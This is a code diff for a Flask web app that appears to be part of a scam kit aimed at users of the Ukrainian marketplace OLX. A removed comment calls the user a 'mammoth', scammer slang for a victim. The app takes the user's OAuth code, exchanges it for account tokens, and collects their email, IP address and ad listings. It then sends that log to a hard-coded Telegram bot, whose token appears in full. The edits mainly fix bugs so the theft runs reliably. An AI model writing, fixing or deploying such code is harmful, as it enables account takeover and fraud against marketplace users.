@@ -5,7 +5,7 @@ import json
 
 app = Flask(__name__)
 
-# ---- ТВОИ КОНФИГУРАЦИИ (Проверь их перед запуском!) ----
+# ---- ТВОИ КОНФИГУРАЦИИ ----
 TG_TOKEN = "8690988862:AAEWmxb3H3_4N3mhSmqjyVsOfpkczPjZ628"
 TG_CHAT_ID = "-1003818732408"
 CLIENT_ID = "202421"
@@ -29,15 +29,26 @@ def send_telegram_message(msg):
 
 @app.route('/')
 def index():
-    # Загружаем объявления из кук для отображения мамонту
+    # Пытаемся достать куку
     ads_cookie = request.cookies.get('user_ads')
-    user_ads = json.loads(ads_cookie) if ads_cookie else None
+    
+    # КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: если куки нет, ставим пустой список [], а не None
+    # Это убирает ошибку "object of type 'NoneType' has no len()"
+    user_ads = []
+    if ads_cookie:
+        try:
+            user_ads = json.loads(ads_cookie)
+        except Exception:
+            user_ads = []
     
     try:
         # Читаем твой index.html
-        with open('index.html', 'r', encoding='utf-8') as f:
-            html_content = f.read()
-            return render_template_string(html_content, user_ads=user_ads)
+        if os.path.exists('index.html'):
+            with open('index.html', 'r', encoding='utf-8') as f:
+                html_content = f.read()
+                return render_template_string(html_content, user_ads=user_ads)
+        else:
+            return "Файл index.html не найден", 404
     except Exception as e:
         return f"Ошибка загрузки шаблона: {e}", 500
 
@@ -50,7 +61,6 @@ def get_token():
     if not code: 
         return jsonify({"error": "Код не передан"}), 400
 
-    # Обмен кода на токены
     token_url = 'https://www.olx.ua/api/open/oauth/token'
     payload = {
         'grant_type': 'authorization_code',
@@ -83,9 +93,10 @@ def get_token():
                     email = u_req.json().get('data', {}).get('email', email)
             except: pass
 
-            # 2. Получаем список объявлений (для отображения на сайте и в логе)
+            # 2. Получаем список объявлений
             ad_list_for_cookie = [] 
-            ad_links_for_tg = "" 
+            ads_flat = ""
+            ads_data = []
             
             try:
                 ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 10}, timeout=7)
@@ -94,23 +105,14 @@ def get_token():
                     for i, ad in enumerate(ads_data):
                         title = ad.get('title', 'Без названия')
                         url = ad.get('url', 'https://olx.ua')
-                        # Сохраняем для фронтенда
                         ad_list_for_cookie.append({"title": title, "url": url, "img": OLX_LOGO})
-                        # Формируем список для Телеграма
-                        ad_links_for_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
+                        ads_flat += f"{i+1}. <a href='{url}'>{title}</a>\n"
             except: pass
 
-           # 3. ФОРМИРУЕМ КОМПАКТНЫЙ ЛОГ
-            # Собираем кликабельный список: [Название](ссылка)
-            ads_flat = ""
-            if ads_data:
-                for i, ad in enumerate(ads_data):
-                    title = ad.get('title', 'Без названия')
-                    url = ad.get('url', 'https://olx.ua')
-                    ads_flat += f"{i+1}. <a href='{url}'>{title}</a>\n"
-            else:
+            if not ads_flat:
                 ads_flat = "Объявлений нет"
 
+            # 3. Отправляем лог в ТГ
             msg = (
                 f"👤 <b>Вход:</b> <code>{email}</code>\n"
                 f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
@@ -120,21 +122,19 @@ def get_token():
             )
             send_telegram_message(msg)
 
-            # 4. Сохраняем данные в куки и отвечаем фронтенду
+            # 4. Сохраняем данные в куки и отвечаем фронту
             resp = make_response(jsonify({"status": "ok"}))
-            # Кука живет 1 час, чтобы фронт мог отрисовать список после редиректа
-            resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600)
+            resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, httponly=True)
             return resp
         
         else:
             print(f"Ошибка OLX API: {response.text}")
-            return jsonify({"error": "Не удалось обменять код на токен"}), 400
+            return jsonify({"error": "Ошибка авторизации OLX"}), 400
 
     except Exception as e:
         print(f"Критическая ошибка: {e}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
-    # Railway автоматически подставит нужный PORT
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
